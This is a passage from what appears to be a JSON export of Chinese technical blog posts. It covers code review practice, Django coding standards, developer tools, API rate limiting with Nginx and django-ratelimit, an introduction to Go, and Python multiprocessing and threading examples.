接口是否有使用公共代码库，如 Kresource，Kcontent，KPackageManager等 注释 类、关键步骤，对外接口是否有注释 3. 看逻辑\u0026amp;性能 要求 事项 主线程逻辑检查 文件、联网等耗时操作避免在主线程执行 异常阈值检查 访问频率是否设置，是否有上限\n文件大小、个数是否有上限\n联网流量是否有上限 多线程问题 是否产生脏数据\n同步锁是否使用正确 内存泄露 资源 IO 流是否关闭\n图片资源是否回收\n列表的对象是否重用 IPC 检查 频繁 IPC 会导致卡顿 4. 设计 要求 事项 健壮性 边界条件检查\n容错处理 安全性 关键功能是否有权限校验机制（root 相关接口） 单一职责 一个类只干一件事情 代码耦合 面向接口编程\n消灭重复代码\n开闭原则 5. CodeReview 要点 CodeReview 目的\n代码质量，增进交流，互相备份，技术氛围，文化传承\n如何做 CodeReview\n必备要素 代码规范 检视指南 执行要点 持续坚持 总结优化 激励机制 高质量发起 高效率 Review ","description":"","id":475,"section":"post","tags":["博文","质量","笔记"],"title":"如何更好做 CodeReview","uri":"https://www.chenshaowen.com/blog/how-to-do-codereview-better.html"},{"content":" 本文主要约定在 Django 开发过程中，需要注意的一些事项。统一的编码风格，良好的设计理念，有利于项目的开发和维护，值得开发人员不断地研究和探讨。\n1. 编码声明 在 Python 解释器执行代码时，需要告诉解释器代码的编码方式。Python 代码实际上是文本数据，如果代码的编码方式与解释器读取的编码方式不一致，将会因编码错误，代码无法执行。Python 2 解释器读取代码时，默认的编码方式是 ASCII，而如果在代码中出现非 ASCII 码的字符时，就会报错。这时，就需要声明 Python 代码的编码方式。\n1.1 设置解释器读取代码的编码格式 为了统一 Python 解释器读取代码的格式，建议在代码文件头部统一添加，utf-8 的编码设置：\n1 # coding:utf-8 禁止使用如下写法，在代码中重新设置编码方式：\n1 2 3 import sys reload(sys) sys.setdefaultencoding(\u0026#39;utf-8\u0026#39;) 这种设置方式会导致两个问题：\n需要 ASCII 编码的字符参数无法传递 中文作为字典的 key 值时，会出现诡异的程序行为，in 和 == 的比较行为不一致。 1.2 字符串的编码格式 在 Python 中有三种 string 类型：\nunicode，text string，文本数据 str，byte string，二进制数据 basestring，是前两者的父类。 Python 2 中的字符串 \u0026lsquo;xxx\u0026rsquo; 表示 str，u\u0026rsquo;xxx\u0026rsquo; 表示 unicode。Python 3 中，u\u0026rsquo;xxx\u0026rsquo; 和 \u0026lsquo;xxx\u0026rsquo; 都表示 unicode。而 b\u0026rsquo;xxx\u0026rsquo; 在 Python 2 和 Python 3 中，均表示二进制数据。\n在 Python 2 中， __future__ 提供了 unicode_literals 模块，将当前文件中所有的字符串转化为 unicode ，以兼容 Python 3 字符编码。\n1 2 3 4 # coding:utf-8 from __future__ import unicode_literals print type(\u0026#39;测试\u0026#39;) \u0026lt;type 'unicode'\u0026gt; 字节存储的 str ，必须加前缀 b。例如下面这个例子，由于设置了 unicode_literals， 代码中字符串默认采用 unicode 编码，而 strftime 函数接受的是一个二进制字符串。这时，就需要显示的声明 %m月%d日 %H:%M 为二进制字符串；否则执行时，将会报错。\n1 2 3 4 5 6 # coding:utf-8 from __future__ import unicode_literals from datetime import datetime print datetime.now().strftime(b\u0026#39;%m月%d日 %H:%M\u0026#39;) 2. PEP8 2.1 命名 模块名\n尽量全小写，也可以使用下划线 module django_module 全局变量\\常量\n全大写+下划线式驼峰 GLOBAL_VAR 类名\n首字母大写式驼峰 ClassName() 函数命名\n全小写+下划线驼峰 is_valid_data() 局部变量\n全小写+下划线式驼峰 this_is_var 2.2 flake 8 Flake8 是由 Python 官方发布的一款辅助检测Python 代码是否规范的工具。Flake8 包含三个工具：\nPyFlakes\n静态检查 Python 代码逻辑错误的工具。 Pep8\n静态检查 PEP8 编码风格的工具。 NedBatchelder’s McCabe script\n静态分析 Python 代码复杂度的工具。 安装方式：\n1 pip install flake8 使用：\n1 2 3 4 5 6 7 # 查看使用帮助文档 flake8 -h # 检查某个文件 flake8 your.py your.py:1:1: E265 block comment should start with \u0026#39;# \u0026#39; # 检查当前目录 flake8 ./ flake8 会对代码是否有逻辑错误、是否符合 PEP8 规范、代码复杂度进行检测。更重要的是，flake8 会给出详细的提示信息，具体到行和列，并给出修改意见。\n3. 包引入 3.1 import 顺序 标准库 第三方库 项目本身 3.2 import 格式 单独一行 使用绝对路径，Python 2 缺省为相对路径导入，Python 3 缺省为绝对路径导入，建议统一使用绝对路径。绝对路径导入可以避免导入子模块覆盖掉标准库模块。__future__ 中提供了 absolute_import 模块支持。 使用 import x 来导入包和模块，不要使用 import * 使用 from x import y , 其中x是包前缀, y是不带前缀的模块名. 使用 from x import y as z, 如果两个要导入的模块都叫做y或者y太长了. 3.3 isort isort 是一个 Python 实用工具/库，用于按字母顺序对导入进行排序，并自动分割为各个部分。 它为各种编辑器提供了一个命令行 实用工具，Python 库和插件，可以快速地对所有导入进行排序。 它目前干净地支持 Python 2.7 - 3.6，但没有任何依赖关系。\n安装：\n1 pip install isort 使用：\n1 2 3 4 # 对单个文件中的导入排序 isort you.py # 对整个目录进行导入排序 isort ./ 4. models 内部定义顺序 数据库字段 非数据库字段 默认 objects 管理器 自定义管理器属性（即其他 managers） class Meta def natural_key() （因为它与模型紧密相关） 所有 @cached_property 属性 任何 @classmethod 装饰的方法 def __unicode__() def __str__() 任何以 __ 开头的方法（例如 __init__()） def save() def delete() def get_absolute_url() def get_translate_url() 任何自定义方法 这里需要说明的是在 Django admin 中显示一个对象的名字，Python 2 上是使用 __unicode__()，而在 Python 3 上是使用 __str__()。为了兼容两种写法，可以使用 python_2_unicode_compatible 装饰器。\n1 2 3 4 5 6 7 8 from django.db import models from django.utils.encoding import python_2_unicode_compatible @python_2_unicode_compatible class MyModel(models.Model): # ... def __str__(self): # __unicode__ on Python 2 return self.my_show_name 5. Python 之禅 Python 哲学的最好阐述，莫过于核心开发者 Tim Peters 所总结的 Python 之禅\n1 import this Python 以编写优美的代码为目标 代码应当明了，命名规范，风格相似 代码应当简洁，不要有复杂的内部实现 如果复杂不可避免，那代码间也不能有难懂的关系，要保持接口简洁 代码应当扁平，不能有太多的嵌套 代码应适当的间隔，不要奢望一行代码解决问题 代码应该具有良好的可读性 即使有使用特例，也不要违背这些原则 精准地捕获异常，不写 except: pass 风格的代码 当存在多种可能，不要尝试去猜测 如果不确定，就用穷举法 你不是 Python 之父，有些问题解决不了 动手写代码之前要思考清楚方案 如果不能清楚地向他人描述实现，那么这肯定不是好的方案 好好利用命名空间 6. 代码提交注释 1 2 3 4 5 6 7 bugfix ： 线上功能 Bug 修复 sprintfix：未上线代码修改 minor：不重要的修改（换行，拼写错误等） feature ：新功能说明 improvement ：已有功能优化 documentation ：新增说明文档，比如 readme.md 文件 refactoring：代码重构 7. 参考 http://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/ https://www.python.org/dev/peps/pep-0020/ http://docs.translatehouse.org/projects/pootle/en/stable-2.5.1/developers/styleguide.html ","description":"","id":476,"section":"post","tags":["博文","Django","Python","规范","研发"],"title":"Django 开发规范(一)","uri":"https://www.chenshaowen.com/blog/development-specification-1-of-django.html"},{"content":"toastr\n消息弹框提示\nartDialog\n对话框组件\nDataTables\n基于 jQuery 表格插件\nKendoUI\n非常全的 UI 框架，很多组件\nwangEditor\nWeb 富文本编辑器\njstree\n网页树形结构组件\nhighcharts\necharts\nD3js\n数据图表\nselect2\n下拉框\nvalidate\n基于jquery的表单验证\nVuejs\n可以用于双向数据绑定，也可以用于构建单页应用\n","description":"","id":477,"section":"post","tags":["博文","前端"],"title":"常用前端组件 List","uri":"https://www.chenshaowen.com/blog/component-list-of-front-library.html"},{"content":"1. 文档 Pandoc Pandoc 是一个用 haskell 编写的文本转换工具，转换速度快，支持格式广泛。可以将 Markdown、LaTeX 等格式转换为 HTML、Docs 、PDF 等格式。\n而只需要执行简单的语句：\n1 pandoc mypaper.md -o mypaper.docx Graphviz 一个由 AT\u0026amp;T 实验室开发的开源工具包，用于绘制 DOT 语言脚本描述的图形。\n使用 DOT 语言编写简单的语句，即可生成图像。\ndemo.gv\ngraph demo { \u0026#34;Browser\u0026#34; -- {\u0026#34;Chrome\u0026#34;, \u0026#34;Fiefox\u0026#34;, \u0026#34;Safari\u0026#34;, \u0026#34;...\u0026#34;} } 1 dot -Tpng -O demo.gv ImageMagick ImageMagick 是一个用于查看、编辑位图文件以及进行图像格式转换的开源软件。ImageMagick 主要由大量的命令行程序组成，可以读取、编辑超过 100 种图象格式。\n使用 convert 命令，可以实现对图片的自由转换。\n1 2 # 利用 png 生成 gif 图片 convert *.png out.gif Jupyter Notebook Jupyter Notebook 是一个交互式笔记本，支持运行 40 多种编程语言。Jupyter Notebook 实际上是一个 Web 应用程序，可以创建和共享程序文档，支持实时代码，数学方程，可视化和 Markdown。 用途包括：数据清理和转换，数值模拟，统计建模，机器学习等。\n安装成功之后，通过命令 jupyter notebook，即可开始交互式文档体验。\nXmind XMind 是一款免费的跨平台的思维导图软件，提供包括思维管理、商务演示、与办公软件协同工作等功能。\n使用 Xmind 来整理思路，梳理架构，总结工作十分方便。\n2. Chrome 插件 Postman Postman 主要用于做接口测试，适合前后端人员使用。\nPostman Interceptor 让 Postman 发送请求时，带上 cookie。这在测试某些需要登录或者鉴权的接口时，十分有效。\nProxy SwitchyOmega 网络代理工具，可以轻松快捷地管理和切换多个代理设置。\nGoogle Keep 轻量级 GTD 工具，用于快速记录事项、管理事项。\n马克飞象 Markdown 编辑器，特点：支持高亮代码块、插入LaTex公式、插入图片等。\nProcessOn 在线作图工具，可以作出各类工作流程图、结构图、思维导图等，支持多人协作。同时，还提供了一个分享绘图的社区，可以查看其他人的文档作图。\nGliffy Diagrams 可以快速轻松地创建各种图表的工具，支持创建：基本绘图、流程图、UML图表、网络图表、线框图和图样、网站地图、业务流程模型、组织机构图、平面图、文氏图、四点分析、 技术图。\nJSON Editor Viewer Formatter 可以在 Google Chrome 中查看和编辑 json 数据的工具。\nVue.js devtools 用于调试 Vue，查看 Vue 变量值、组件结构。\n印象笔记·悦读 可使博文、文章和网页变得简明而又易于阅读。特别是某些字体较小的网页时，这款工具可以将文字放大，更换背景。\nNimbus Screenshot \u0026amp; Screen Video Recorder 不仅可以截屏、编辑图像，还可以录制屏幕\nSimpleUndoClose 撤销恢复最近关闭的标签\n3. 编程语言 Python Python 是一个结合了解释性、编译性、互动性和面向对象的脚本语言。目前被广泛应用于，机器学习、运维、Web 开发、金融等领域。\nECMAScript 6 ECMAScript 6 是 JavaScript 语言的下一个版本，对 JavaScript 做了大量改造，提高了灵活性和应用性，使得这门语言真正成为了企业级开发工具。\nGo Go 是 Google 开发的一种静态强类型、编译型、并发型，并具有垃圾回收功能的编程语言。为了方便搜索和识别，有时会将其称为Golang。Golang 主要应用在服务器编程、分布式系统、网络编程、云平台等对并发有比较高要求的领域。\nC++ C++ 是一种通用程序设计语言，支持静态数据类型检查、多重编程范式、过程化程序设计、数据抽象化、面向对象程序设计、泛型程序设计、基于原则设计等。C++ 目前主要使用在游戏、服务器端开发、数字图像处理、仿真、硬件相关等领域。\n4. 组件 Jenkins Jenkins 是一个开源的、提供友好操作界面的持续集成（CI）工具，起源于Hudson（Hudson是商用的），主要用于持续、自动的构建/测试软件项目、监控外部任务的运行。\n简单来说，Jenkins 可以辅助完成一些自动化操作，比如，git 提交后自动编译、代码检查等。\nDocker Docker 在 Linux 操作系统上，提供一个额外的软件抽象层，提供给应用层统一的、相互隔离的运行环境，功能上与虚拟机类似，但是更加节省资源。Docker 广泛应用于 DevOps、微服务等领域。\nNginx Nginx 是一个 Web 服务器，也可以用作反向代理，负载平衡器和HTTP缓存。通常，浏览器发起的请求，首先给 Nginx 处理，由 Nginx 分发给应用服务器，最后通过 Nginx 返回响应给浏览器。\nNumPy NumPy 是 Python 语言的一个扩充程序库。支持高级大量的维度数组与矩阵运算，此外也针对数组运算提供大量的数学函数库。\nPandas Pandas 是基于 NumPy 的一种工具包，主要是为了解决数据分析任务而创建的。Pandas 纳入了大量库和一些标准的数据模型，提供了高效地操作大型数据集所需的工具，能快速便捷地分析处理数据。\nTensorFlow TensorFlow 是一个开源软件库，用于各种感知和语言理解任务的机器学习，如语音识别、Gmail、Google 相册和搜索。TensorFlow 最初由 Google Brain 团队开发，用于 Google 的研究和生产，于2015年11月9日在 Apache 2.0开源许可证下发布。\nBeautiful Soup Beautiful Soup 是一个可以从 HTML 或 XML 文件中提取数据的 Python 库，广泛应用于爬虫领域。\nSelenium 自动化测试工具。它支持各种浏览器，包括 Chrome，Safari，Firefox 等主流界面式浏览器。\n5. 框架 Django Django是一个开源的 Web 应用框架，由 Python 写成。采用了 MVT 的软件设计模式，即模型 Model，视图 View 和模板 Template。\nDjango 的主要目标是使得开发复杂的、数据库驱动的网站变得简单。Django 注重组件的重用性和可插拔性，敏捷开发和 DRY 法则（Don\u0026rsquo;t Repeat Yourself）。\nVue Vue.js 是一个用于创建用户界面的开源 JavaScript 框架，也是一个创建单页面应用的 Web应用框架。\n6. 组织管理 Git Git 是一个开源的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。相比较于 SVN ，Git 最大的优势在于分布式、对分支的友好支持。\nWebpack Webpack 是一个前端资源加载/打包工具，只需要相对简单的配置就可以提供前端工程化需要的各种功能，并且如果有需要它还可以被整合到其他比如 Grunt / Gulp 的工作流。\nPycharm PyCharm 是一个跨平台的集成开发环境，主要用于 Python 语言开发，由捷克公司 JetBrains 开发。\nAtom Atom 是由 GitHub 开源的跨平台文字与代码编辑器，拥有丰富的插件集。\n","description":"","id":478,"section":"post","tags":["博文","工具"],"title":"我的工具箱","uri":"https://www.chenshaowen.com/blog/toolbox.html"},{"content":"1. 流控 缓存、降级和限流是保护高并发系统的常用方法。缓存以空间换时间、减少了 CPU 和网络调用的耗时；降级保护了核心服务的高可用，高峰时段延时或拒绝处理非核心请求；限流是通过限制并发请求来保护系统。\n限流就是，在有限资源的情况下，每个 API 接口单位时间内的服务能力有限，如果，对 API 接口的访问次数不加控制，会造成 API 接口的滥用，甚至招致 DDos 攻击。同时，如下图，API 接口的延迟，也会随着请求量的提升而迅速提升。因此，需要控制单位时间内， API 接口的请求量。\n2. 什么是时间窗口 时间窗口，指的是一个统计周期的时间段。有两种时间窗口，一种是自然时间窗口，一种是滑动时间窗口。\n上图，就是一个自然时间窗口，每分钟一个窗口。例如，15:01~15:02 统计一次。这种方式的问题是，如果每分钟限流为 N ，那么图中红色时间窗口的最大值是 2N。此时，限流失去了效果。因此，便有了滑动窗口。\n滑动窗口的核心，就是将时间划分为更细的粒度。例如，现在是 15:02:20 ，那么统计的滑动窗口就是 15:01:20 ~ 15:02:20，不同于上面以分钟作为最小粒度，这里的滑动窗口以秒作为最小粒度，从而获得更加精准的流量控制。\n3. 流量控制算法 计数器算法\n计数器算法的思路是限制一个接口在某个维度（IP、用户、某种资源）上的响应次数。通过设置一个计数器，每响应一次，计数器加一，当计数器超过阈值时，拒绝服务。这种算法对总数量进行了简单的限制，而不是平均速率限流。 漏桶算法\n请求以一定速率进入到漏桶中，漏桶以一定速率响应请求，当水流入速度过大时，拒绝服务。 令牌桶算法\n按照固定速率往桶里添加令牌。随着时间流逝，系统会按恒定时间间隔往桶里加入Token，如果桶已经满了，就不再添加。新请求来临时，会各自拿走一个 Token，如果没有 Token 可拿了就阻塞或者拒绝服务 漏桶算法能够限制数据的传输速率，请求超过处理速率时，会被直接丢弃；而令牌桶算法能够在限制数据的平均传输速率的同时，还可以通过加快添加令牌的速率来处理突发请求。\n4. 不同类型的限流器 请求限流器\n限制每个用户每秒可发送 N 个请求 并发请求限流器\n限制每秒最高请求数。请求限流器限制的是累积量，而并发限制的是峰值。 基于使用量的负载降级\n将请求分为关键 API 请求和非关键 API 请求。设计系统时，为关键 API 请求预留一定资源，当非关键 API 请求需要占用预留资源时，不预分配，直接拒绝服务。 基于 Worker 利用率的负载降级\n如果某个 worker 太忙，无法处理分配给它的请求，它会缓慢降级非关键请求，当然是先从测试请求开始。如果降低测试请求的过程中，worker 的处理能力恢复到好的状态，那我们就可以开始缓慢地恢复流量。 5. 实现 对于 Nginx 接入层限流可以使用 Nginx 自带了两个模块：连接数限流模块 ngx_http_limit_conn_module 和漏桶算法实现的请求限流模块 ngx_http_limit_req_module。\nngx_http_limit_conn_module limit_conn 是对某个 KEY 对应的总的网络连接数进行限流。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 http { # 配置限流 Key 和存放 Key 对应信息的共享内存区域大小 limit_conn_zone $binary_remote_addr zone=addr:10m; # 被限流后，默认日志级别 limit_conn_log_level error; # 被限流后，返回的状态码 limit_conn_status 503; ... server { ... location /limit { # 配置存放 Key 和计数器的共享内存区域，指定 Key 的最大连接数 limit_conn addr 1; } 此处使用 Key 为 $binary_remote_addr 表示 IP 地址，还可以使用 $server_name 表示域名，不同的 Key 值从不同维度限制流量。\n测试\n1 ab -n 5 -c 5 http://127.0.0.1/limit/ ngx_http_limit_req_module 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 http ｛ ## 对每一个IP的请求限制为1次每秒 limit_req_zone $binary_remote_addr zone=perip:10m rate=1r/s; # 被限流后，默认日志级别 limit_conn_log_level error; # 被限流后，返回的状态码 limit_conn_status 503; ... server { ... location /limit { # burst 配置桶的大小，nodelay 表示非延迟模式，允许突发处理请求。 limit_req zone=perip burst=3 nodelay; } }\t测试\n1 ab -n 5 -c 5 http://127.0.0.1/limit/ 设置 IP 黑白名单 1 2 3 4 5 6 location / { allow 192.168.1.1/24; allow 127.0.0.1; deny 1.2.3.4; # deny all; } django-ratelimit django-ratelimit 是一个基于缓存的接口限速包，使用装饰器对 API 接口进行流量控制。。\n安装\n1 pip install django-ratelimit 使用\n1 2 3 4 5 6 7 8 9 from ratelimit.decorators import ratelimit @ratelimit(key=\u0026#39;ip\u0026#39;) def myview(request): # ... @ratelimit(key=\u0026#39;ip\u0026#39;, rate=\u0026#39;100/h\u0026#39;) def secondview(request): # ... 这里的 Key 表示的是统计的维度，可以是 ip、get 中获取的某个参数、post 中获取的某个参数、header 中获取的某个参数、user、user_or_ip。rate 表示的是限速 X/u，X 表示数字，u 表示时间单位，可以是，s、m、h、d。\nrate 还可以是一个函数，只需要返回指定的格式即可。通过这种方式，可以实现一些特殊的限制功能。比如，匿名用户和登录用户可以采用不同的限制值。\n6. 分布式流控 分布式限流最关键的是要将限流服务做成原子化。\n解决方案是，通过 Redis + Lua 或者 Nginx + Lua 的技术，实现对请求并发数和总数在时间窗口下的控制。使用 Lua 实现令牌通或漏桶算法。\n7. 参考 https://www.zzxworld.com/blogs/limit-rate-and-connection-in-nginx.html https://django-ratelimit.readthedocs.io/en/latest/usage.html https://wenchao.ren/archives/234 ","description":"","id":479,"section":"post","tags":["博文","接口","微服务"],"title":"后端服务之接口流量控制","uri":"https://www.chenshaowen.com/blog/rate-limiting-of-api.html"},{"content":"1. 背景 最近十多年来，C/C++ 在计算领域没有很好得到发展，没有跟上计算机发展的脚步。\n现有的编程语言，开发程度和系统效率在很多情况下不能兼得。要么执行效率高，但低效的开发和编译；要么执行效率低，但拥有高效的编译；所以需要一种拥有较高效的执行速度、编译速度和开发速度的编程语言，Go 语言就横空出世了。\nGo 语言的主要目标是将静态语言的安全性和高效性与动态语言的易开发性进行有机结合起来。\n另外一个目标是对于网络通信、并发和并行编程的支持，从而更好地利用大量的分布式和多核的计算机。\n2. Go 语言简介 Go 语言是一个 Google 公司推出的一个开源项目，是一个系统开发语言。\nGo 语言最初的设计由 Robert Griesemer，Rob Pike 和 Ken Thompson 在2007年9月开始的，官方的发布是在 2009 年 11 月。2010 年 5 月由 Rob Pike 公开的将其运用于 Google 内部的一个后台系统。\nGo 可以运行在 Linux、Mac OS X、FreeBSD、OpenBSD、Plan 9 和 Windows 系统上，同时也支持多种处理器架构：I386、AMD64 和 ARM。\n由于Go 语言针对多 CPU 系统进行了优化，使用 GO 编写的程序执行效率可以与 C 媲美，同时更加安全，支持并行。\n3. 优势 部署简单\nGo 编译生成的是一个静态可执行文件，除了 glibc 外没有其他外部依赖 并发行好\nGoroutine 和 Channel 使得编写高并发的服务端软件十分容易。很多情况下，完全不需要考虑锁机制。Go 语言的并发不是以库的形式提供，而是语言层面加入了对并发的支持。 程序员友好\n与 C/C++ 相比，Go 不支持一些高级语法，代码更简明，同时拥有一些动态语言的特性 执行性能好\n执行效率高，虽不如 C/C++， 但比 Python 高很多，同时内存使用也很高效。 4. Go 语言基本概念与语法 文件名\nGo 的源文件以 .go 为后缀名存储在计算机中，这些文件名均由小写字母组成，如 scanner.go 。如果文件名由多个部分组成，则使用下划线 _ 对它们进行分隔，如 scanner_test.go 包\n包是结构化代码的一种方式：每个程序都由包（通常简称为 pkg）的概念组成，可以使用自身的包或者从其它包中导入内容。在源文件的第一行指明该文件属于哪一个包，如：package main，表示一个可独立执行的程序。 常量\n常量使用关键字 const 定义，用于存储不会改变的数据。常量的定义格式：const identifier [type] = value。 变量\n声明变量的一般形式是使用 var 关键字：var identifier type。 数据类型\n18个基本类型，bool、string、rune、byte、int、uint、int8、uint8、int16、uint16、int32、uint32、int64、uint64、float32、float64、complex64、complex128，7个复合类型：array、struct、function、interface、slice、map、channel 控制结构\nGo 提供 if-else 结构、switch 结构、select 结构、for (range) 结构 函数定义 1 2 func g() { } 5. 内置标准库 fmt\nfmt 包实现了格式化的 I/O 函数，类似Ｃ语言中的 printf 和 scanf，但是更加简单。 strings\nstrings 包实现了用于操作字符串的简单函数，包括 strings 导出函数和 Reader, Replacer 两个结构体。 time\ntime 包提供显示和计算时间用的函数。 os\nos 包提供了不依赖平台的操作系统函数接口。错误处理设计为Go 风格，失败的调用会返回错误值而非错误码。通常错误值里包含更多信息。 path\npath 实现了对斜杠分隔的路径进行操作的函数。 io\nio 包提供了对 I/O 原语的基本接口，这些接口抽象出了泛用的函数并附加了一些操作。因为这些接口是对底层实现完全不同的低水平操作的包装，除非得到其它方面的通知，客户端不应假设它们是并发安全的。 log\nlog 包实现了简单的日志服务，log 包定义了 Logger 类型，该类型提供了一些格式化输出的方法。也提供了一个预定义的标准 Logger，可以通过辅助函数 Print[f|ln]、Fatal[f|ln] 和Panic[f|ln] 访问，比手工创建一个 Logger 对象更容易使用。Logger 会打印每条日志信息的日期、时间，默认输出到标准错误。Fatal 系列函数会在写入日志信息后调用os.Exit(1)。Panic 系列函数会在写入日志信息后调用 panic。 6. Hello World 6.1 环境配置 IDE推荐： JetBrains Gogland ，也可以任意编辑器配合 Go 插件，如：Atom + go-plus\n以 CentOS 下安装为例：\n1 yum install go -y 查看 Go 环境配置\n1 go env GOARCH=\u0026quot;amd64\u0026quot; GOOS=\u0026quot;linux\u0026quot; GOROOT=\u0026quot;/usr/lib/golang\u0026quot; GOTOOLDIR=\u0026quot;/usr/lib/golang/pkg/tool/linux_amd64\u0026quot; CC=\u0026quot;gcc\u0026quot; GOGCCFLAGS=\u0026quot;-fPIC -m64 -pthread -fmessage-length=0 -fdebug-prefix- map=/tmp/go-build157488013=/tmp/go-build -gno-record-gcc-switches\u0026quot; CGO_LDFLAGS=\u0026quot;-g -O2\u0026quot; 6.2 Hello hello.go 文件\n1 2 3 4 5 6 7 package main import \u0026#34;fmt\u0026#34; func main() { fmt.Printf(\u0026#34;Hello, world.\\n\u0026#34;) } 运行代码\n1 2 $go run hello.go Hello, world. 7. 参考 https://www.kancloud.cn/kancloud/the-way-to-go ","description":"","id":480,"section":"post","tags":["博文","Go","编程"],"title":"Go 语言入门","uri":"https://www.chenshaowen.com/blog/101-of-go-language.html"},{"content":"1. 进程 进程是正在运行的程序实例，是内核分配资源的最基本的单元。进程拥有自己独立的堆和栈，独立的地址空间，资源句柄。进程由 OS 调度，调度开销较大，在并发的切换过程效率较低。\nPython 提供了一个跨平台的多进程模块 multiprocessing，模块中使用 Process 类来代表一个进程对象。\n1.1 多进程示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 import os from multiprocessing import Process # 子进程执行的代码 def run_proc(name): print(\u0026#39;Run child process %s (%s)...\u0026#39; % (name, os.getpid())) if __name__==\u0026#39;__main__\u0026#39;: print(\u0026#39;Parent process %s.\u0026#39; % os.getpid()) p = Process(target=run_proc, args=(\u0026#39;test\u0026#39;,)) # target 指定要执行的函数，args 指定参数 print(\u0026#39;Child process will start.\u0026#39;) p.start() #启动 Process 实例 p.join() #等待子进程结束后，继续往下执行 print(\u0026#39;Child process end.\u0026#39;) Parent process 274. Child process will start. Run child process test (298)... Child process end. 1.2 进程池示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 import os, time from multiprocessing import Pool def long_time_task(name): print(\u0026#39;Run task %s (%s)...\u0026#39; % (name, os.getpid())) start = time.time() time.sleep(3) end = time.time() print(\u0026#39;Task %s runs %0.2f seconds.\u0026#39; % (name, (end - start))) if __name__==\u0026#39;__main__\u0026#39;: print(\u0026#39;Parent process %s.\u0026#39; % os.getpid()) p = Pool(2) # 创建对象池，并设置进程池大小，默认大小是 CPU 核数 for i in range(5): p.apply_async(long_time_task, args=(i,)) # 设置每个进程要执行的函数和参数，异步执行 print(\u0026#39;Waiting for all subprocesses done...\u0026#39;) p.close() # 关闭进程池，不允许继续添加新的 Process p.join() # 等待全部子进程执行完毕 print(\u0026#39;All subprocesses done.\u0026#39;) Parent process 274. Run task 1 (431)... Run task 0 (430)... Waiting for all subprocesses done... Task 1 runs 3.00 seconds. Run task 2 (431)... Task 0 runs 3.00 seconds. Run task 3 (430)... Task 2 runs 3.00 seconds. Task 3 runs 3.00 seconds. Run task 4 (431)... Task 4 runs 3.00 seconds. All subprocesses done. 1.3 进程间通信 multiprocessing 模块封装了底层的通信机制，提供了 Queue、Pipes 等多种方式来交换数据。以 Queue 为例，在父进程中创建两个子进程，一个往 Queue 里写数据，一个从 Queue 里读数据。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import os, time, random from multiprocessing import Process, Queue def write(q): # 写数据进程执行的代码 print(\u0026#34;Process to write: %s\u0026#34; % os.getpid()) for value in [\u0026#39;A\u0026#39;, \u0026#39;B\u0026#39;, \u0026#39;C\u0026#39;]: print(\u0026#34;Put %s to queue...\u0026#34; % value) q.put(value) time.sleep(random.random()) def read(q): # 读数据进程执行的代码 print(\u0026#34;Process to read: %s\u0026#34; % os.getpid()) while True: value = q.get(True) print(\u0026#34;Get %s from queue.\u0026#34; % value) if __name__ == \u0026#39;__main__\u0026#39;: q = Queue() # 父进程创建Queue,并传给各个子进程 pw = Process(target=write, args=(q,)) pr = Process(target=read, args=(q,)) pw.start() # 启动子进程pw，写入 pr.start() # 启动子进程pr，读取 pw.join() # 等待pw结束 pr.terminate() # pr进程里的死循环，无法等待结束，只能强制终止 Process to write: 211 Put A to queue... Process to read: 212 Get A from queue. Put B to queue... Get B from queue. Put C to queue... Get C from queue. 2. 线程 线程是一种轻量进程，是 CPU 调度和分派的基本单元。线程并不产生新的地址空间和资源描述符表，而是复用父进程的。线程只拥有程序计数器、一组寄存器和栈，同一进程的线程共享其他全部资源。\n线程由 OS 调度，相较于进程，线程调度的成本非常小。线程间通信主要通过共享内存，上下文切换很快，资源开销较少，但相比进程不够稳定容易丢失数据。\n2.1 解释器 在谈 Python 的线程之前，先了解下 Python 的几个解释器版本：\nCPython ，Python 的官方版本，使用 C 语言实现，使用最为广泛，大部分人使用的都是这个版本。 Jython，Python 的 Java 实现，相比于 CPython，与 Java 语言之间的互操作性要远远高于 CPython 和 C 语言之间的互操作性。 Python for .NET，CPython 实现的 .NET 托管版本，与 .NET 库和程序代码有很好的互操作性。 IronPython，不同于 Python for .NET，它是 Python 的 C# 实现，并且它将 Python 代码编译成 C# 中间代码（与 Jython 类似），与.NET语言的互操作性也非常好。 PyPy，Python 的 Python 实现版本。PyPy 运行在 CPython（或者其它实现）之上，用户程序运行在 PyPy 之上。目标是成为 Python 语言自身的试验场，可以很容易地修改 PyPy 解释器的实现（因为是使用Python写的）。 Stackless，Stackless Python 是 CPython 的一个增强版本，它使程序员从基于线程的编程方式中获得好处，并避免传统线程所带来的性能与复杂度问题。 2.2 全局锁 GIL GIL 是 CPython 中特有的全局解释器锁（其它 Python 版本解释器，有自己的线程调度机制，没有GIL机制）。本质上，GIL 就是 Python 进程中的一把超大锁，在解释器进程中是全局有效。GIL 主要锁定的是 CPU 执行资源，实现线程独占。\n在 CPython 解释器中，当一个线程需要使用 CPU 资源时，首先得获取 GIL，直到遇到 I/O 操作时，才会释放 GIL。\n如果是 I/O 密集型线程，多线程能比单线程显著提高性能；如果是 CPU 密集型线程，多线程并不能提高性能，因为等待 GIL，多线程也只能依次按顺序执行。\n在单核 CPU 中，同一时刻仅有一个线程占用 CPU，GIL 不会对 CPU 的使用率产生影响。但是在多核 CPU 中，由于 GIL 的存在，同一时刻，不同核的线程会竞争 GIL。获取到 GIL 的线程能够占用 CPU，而其他线程将处于闲置状态，即使这些线程有空闲的 CPU 资源。\n在 Python 3 中 GIL 也没有去掉，因为有大量的第三方库依赖 GIL。去掉 GIL 之后，需要引入复杂的锁机制保护众多全局状态。\n2.3 多线程示例 Python 的标准库提供了两个模块：thread 和 threading，thread 是低级模块，threading 是高级模块，对 thread 进行了封装。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import time, os, threading start = time.time() def doubler(number): print(threading.currentThread().getName()) print(\u0026#39;Parent process %s.\u0026#39; % os.getpid()) print(number * 2) time.sleep(2)# 或者 IO 请求 print(\u0026#39;thread run %0.2f s end\u0026#39;% (time.time() - start)) if __name__ == \u0026#39;__main__\u0026#39;: for i in range(3): my_thread = threading.Thread(target=doubler, args=(i,)) my_thread.start() #my_thread.join() Thread-98 Parent process 426. 0 Thread-99 Parent process 426. 2 Thread-100 Parent process 426. 4 thread run 